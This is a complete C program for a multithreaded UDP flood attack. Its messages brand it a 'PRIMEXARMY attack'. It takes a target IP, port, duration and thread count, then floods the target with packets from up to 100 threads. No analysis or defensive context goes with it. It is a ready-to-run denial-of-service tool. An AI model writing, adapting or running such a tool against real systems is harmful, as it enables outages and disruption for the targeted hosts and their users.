#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/crypto.h>

#define MAX_THREADS 100
#define PACKET_SIZE 1024

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
} attack_data_t;

int active_connections = 0;
pthread_mutex_t lock;

void *udp_flood(void *arg) {
    attack_data_t *data = (attack_data_t *)arg;
    int sockfd;
    struct sockaddr_in server_addr;
    char packet[PACKET_SIZE];
    time_t start_time = time(NULL);
    time_t current_time;
    
    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        return NULL;
    }
    
    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);
    
    // Fill packet with random data
    memset(packet, 'A', PACKET_SIZE);
    
    pthread_mutex_lock(&lock);
    active_connections++;
    pthread_mutex_unlock(&lock);
    
    printf("Thread %d started attack on %s:%d\n", data->thread_id, data->ip, data->port);
    
    // Attack loop
    do {
        sendto(sockfd, packet, PACKET_SIZE, 0, 
               (struct sockaddr *)&server_addr, sizeof(server_addr));
        usleep(1000); // 1ms delay
        current_time = time(NULL);
    } while (current_time < start_time + data->duration);
    
    close(sockfd);
    
    pthread_mutex_lock(&lock);
    active_connections--;
    pthread_mutex_unlock(&lock);
    
    printf("Thread %d finished\n", data->thread_id);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    
    if (num_threads > MAX_THREADS) {
        printf("Maximum threads exceeded. Using %d threads.\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }
    
    pthread_t threads[MAX_THREADS];
    attack_data_t thread_data[MAX_THREADS];
    
    pthread_mutex_init(&lock, NULL);
    
    printf("Starting PRIMEXARMY attack on %s:%d for %d seconds with %d threads\n", 
           ip, port, duration, num_threads);
    
    // Create threads
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].port = port;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;
        strncpy(thread_data[i].ip, ip, sizeof(thread_data[i].ip) - 1);
        
        if (pthread_create(&threads[i], NULL, udp_flood, &thread_data[i]) != 0) {
            printf("Failed to create thread %d\n", i);
        }
    }
    
    // Wait for all threads to complete
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_mutex_destroy(&lock);
    printf("Attack completed. All threads finished.\n");
    
    return 0;
}
